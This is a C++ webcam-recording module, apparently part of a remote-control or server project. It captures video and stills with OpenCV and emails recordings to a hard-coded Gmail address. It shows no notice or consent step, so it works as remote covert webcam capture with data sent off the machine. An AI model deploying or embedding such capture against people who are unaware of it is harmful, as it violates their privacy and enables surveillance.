#include "recording.h"
#include <opencv2/opencv.hpp>
#include <thread>
#include <atomic>
#include <chrono>
#include <windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <mutex>

using namespace std;

extern void send_email_with_attachment(const string& to, const string& subject,
                                       const string& body,
                                       const string& filepath);

// Global state with better thread safety
static std::atomic<bool> recording(false);
static std::thread recordingThread;
static string video_path;
static std::mutex recording_mutex;  // Protects video_path access

bool isValidTempPath(const string& path) {
  try {
    return std::filesystem::exists(path) && std::filesystem::is_directory(path);
  } catch (const std::filesystem::filesystem_error& e) {
    cerr << "Filesystem error checking temp path: " << e.what() << endl;
    return false;
  }
}

// REMOVED send_picture() function to avoid conflict with sendPicture.cpp

void start_recording() {
  // Atomic compare-and-swap to prevent race conditions
  bool expected = false;
  if (!recording.compare_exchange_strong(expected, true)) {
    cout << "Recording already in progress!" << endl;
    return;
  }

  char temp_path[MAX_PATH];
  if (GetTempPathA(MAX_PATH, temp_path) == 0) {
    cerr << "Failed to get temp directory path!" << endl;
    recording = false;
    return;
  }

  string temp_dir(temp_path);
  if (!isValidTempPath(temp_dir)) {
    cerr << "Invalid temp directory: " << temp_dir << endl;
    recording = false;
    return;
  }

  {
    std::lock_guard<std::mutex> lock(recording_mutex);
    video_path = temp_dir + "recorded_video.avi";
  }

  recordingThread = std::thread([]() {
    cv::VideoCapture cap(0);
    cv::VideoWriter writer;

    try {
      if (!cap.isOpened()) {
        cerr << "Failed to open webcam!" << endl;
        recording = false;
        return;
      }

      // Get camera properties
      int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
      int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
      int fps = static_cast<int>(cap.get(cv::CAP_PROP_FPS));
      if (fps <= 0 || fps > 60) fps = 15;

      // Set better camera properties if possible
      cap.set(cv::CAP_PROP_FRAME_WIDTH, 1280);
      cap.set(cv::CAP_PROP_FRAME_HEIGHT, 720);
      cap.set(cv::CAP_PROP_FPS, fps);

      // Re-read properties after setting
      frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
      frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));

      string current_video_path;
      {
        std::lock_guard<std::mutex> lock(recording_mutex);
        current_video_path = video_path;
      }

      // Define the codec and create VideoWriter object
      writer.open(current_video_path,
                  cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), fps,
                  cv::Size(frame_width, frame_height));

      if (!writer.isOpened()) {
        cerr << "Failed to open VideoWriter for: " << current_video_path
             << endl;
        recording = false;
        return;
      }

      cout << "Started recording video to: " << current_video_path << endl;

      cv::Mat frame;
      auto start_time = std::chrono::steady_clock::now();
      int frame_count = 0;
      int consecutive_empty_frames = 0;
      const int max_empty_frames = 10;

      while (recording) {
        cap >> frame;

        if (frame.empty()) {
          consecutive_empty_frames++;
          if (consecutive_empty_frames >= max_empty_frames) {
            cerr << "Too many consecutive empty frames, stopping recording!"
                 << endl;
            break;
          }
          std::this_thread::sleep_for(std::chrono::milliseconds(10));
          continue;
        }

        consecutive_empty_frames = 0;
        writer.write(frame);
        frame_count++;

        // Maintain steady frame rate
        auto target_time =
            start_time + std::chrono::milliseconds(frame_count * 1000 / fps);
        std::this_thread::sleep_until(target_time);
      }

      cout << "Recorded " << frame_count << " frames." << endl;

    } catch (const std::exception& e) {
      cerr << "Exception in recording thread: " << e.what() << endl;
    }

    // Cleanup
    if (cap.isOpened()) {
      cap.release();
    }
    if (writer.isOpened()) {
      writer.release();
    }

    cout << "Stopped recording." << endl;
  });

  // Verify thread started successfully
  if (!recordingThread.joinable()) {
    recording = false;
    cerr << "Failed to start recording thread!" << endl;
    return;
  }
}

void stop_and_send_recording() {
  if (!recording) {
    cout << "No recording is in progress!" << endl;
    return;
  }

  cout << "Stopping recording..." << endl;
  recording = false;

  if (recordingThread.joinable()) {
    recordingThread.join();
  }

  string current_video_path;
  {
    std::lock_guard<std::mutex> lock(recording_mutex);
    current_video_path = video_path;
  }

  // Verify video file was created and has content
  try {
    if (!std::filesystem::exists(current_video_path)) {
      cerr << "Video file was not created: " << current_video_path << endl;
      return;
    }

    auto file_size = std::filesystem::file_size(current_video_path);
    if (file_size == 0) {
      cerr << "Video file is empty: " << current_video_path << endl;
      return;
    }

    cout << "Video file created successfully (" << file_size << " bytes)"
         << endl;

    // Send the video via email
    send_email_with_attachment("serverbottestmmt@gmail.com", "Webcam Video",
                               "Here is a recorded webcam video.",
                               current_video_path);
  } catch (const std::filesystem::filesystem_error& e) {
    cerr << "Filesystem error: " << e.what() << endl;
  }
}

// Cleanup function to call on program exit
void cleanup_recording() {
  if (recording) {
    recording = false;
    if (recordingThread.joinable()) {
      recordingThread.join();
    }
  }
}

// Hàm để tích hợp với server - record trong thời gian xác định
void run_recording_and_save(const std::string& outFilePath,
                            int duration_seconds) {
  namespace fs = std::filesystem;

  // Tạo thư mục nếu chưa có
  fs::create_directories(fs::path(outFilePath).parent_path());

  cv::VideoCapture cap(0);
  if (!cap.isOpened()) {
    cerr << "[Server] Failed to open webcam!" << endl;
    return;
  }

  // Get camera properties
  int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
  int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
  int fps = RecordingConfig::DEFAULT_FPS;

  // Set better camera properties
  cap.set(cv::CAP_PROP_FRAME_WIDTH, RecordingConfig::DEFAULT_WIDTH);
  cap.set(cv::CAP_PROP_FRAME_HEIGHT, RecordingConfig::DEFAULT_HEIGHT);
  cap.set(cv::CAP_PROP_FPS, fps);

  // Re-read properties after setting
  frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
  frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));

  cv::VideoWriter writer(outFilePath,
                         cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), fps,
                         cv::Size(frame_width, frame_height));

  if (!writer.isOpened()) {
    cerr << "[Server] Failed to open VideoWriter for: " << outFilePath << endl;
    return;
  }

  cout << "[Server] Started recording video for " << duration_seconds
       << " seconds to: " << outFilePath << endl;

  cv::Mat frame;
  auto start_time = std::chrono::steady_clock::now();
  auto end_time = start_time + std::chrono::seconds(duration_seconds);
  int frame_count = 0;

  while (std::chrono::steady_clock::now() < end_time) {
    cap >> frame;

    if (!frame.empty()) {
      writer.write(frame);
      frame_count++;
    }

    // Maintain steady frame rate
    std::this_thread::sleep_for(std::chrono::milliseconds(1000 / fps));
  }

  // Cleanup
  cap.release();
  writer.release();

  cout << "[Server] Finished recording " << frame_count
       << " frames to: " << fs::absolute(outFilePath) << endl;
}

// Hàm để chụp ảnh và lưu vào file cụ thể (cho recording module)
void capture_picture_to_file(const std::string& outFilePath) {
  namespace fs = std::filesystem;

  // Tạo thư mục nếu chưa có
  fs::create_directories(fs::path(outFilePath).parent_path());

  cv::VideoCapture cap(0);
  if (!cap.isOpened()) {
    cerr << "[Server] Failed to open webcam!" << endl;
    return;
  }

  // Set camera properties for better quality
  cap.set(cv::CAP_PROP_FRAME_WIDTH, RecordingConfig::DEFAULT_WIDTH);
  cap.set(cv::CAP_PROP_FRAME_HEIGHT, RecordingConfig::DEFAULT_HEIGHT);

  cv::Mat frame;

  // Try multiple times to get a valid frame
  int attempts = 0;

  do {
    cap >> frame;
    if (!frame.empty()) break;

    attempts++;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
  } while (attempts < RecordingConfig::MAX_CAPTURE_ATTEMPTS);

  cap.release();

  if (frame.empty()) {
    cerr << "[Server] Failed to capture image after "
         << RecordingConfig::MAX_CAPTURE_ATTEMPTS << " attempts!" << endl;
    return;
  }

  // Save image to file
  bool saved = cv::imwrite(outFilePath, frame);
  if (!saved) {
    cerr << "[Server] Failed to save image to: " << outFilePath << endl;
    return;
  }

  cout << "[Server] Picture saved to: " << fs::absolute(outFilePath) << endl;
}